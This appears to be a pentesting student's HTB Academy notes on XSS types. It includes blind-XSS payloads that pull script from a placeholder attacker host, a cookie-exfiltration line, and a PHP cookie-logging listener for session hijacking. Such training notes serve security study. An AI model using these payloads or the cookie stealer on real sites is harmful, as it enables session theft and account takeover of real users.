---
title: "XSS"
date: 2026-02-06 12:00:00 +0300
categories: [Writeups, HTB Academy]
tags: [htb-academy, notes, cybersecurity, pentesting, methodology]
description: "Stored, Reflected, and DOM-based Cross-Site Scripting (XSS) payload delivery, session hijacking, and WAF filter evasion."
image:
  path: /assets/img/posts/xss.jpg
  alt: XSS
---

3 types of xss

- persistent ⇒ sticks in backend, everyone gets a share

reflective ⇒ processed in backend, for infecing, we need to send a link to victim

dom ⇒ never reaches backend, executed on client js

```bash

<img src="" onerror=alert(window.origin)>
```

**Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).**

you can try to write your automated python script for trying payloads for xss

for reflected xss, we need to send to url itself. not the payload. with payload we tamper with link, with that link we do attack

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss

```bash
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

```bash
Fau5t@htb[/htb]$ mkdir /tmp/tmpserver
Fau5t@htb[/htb]$ cd /tmp/tmpserver
Fau5t@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

```bash
new Image().src='http://OUR_IP/index.php?c='+document.cookie

```

```bash
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
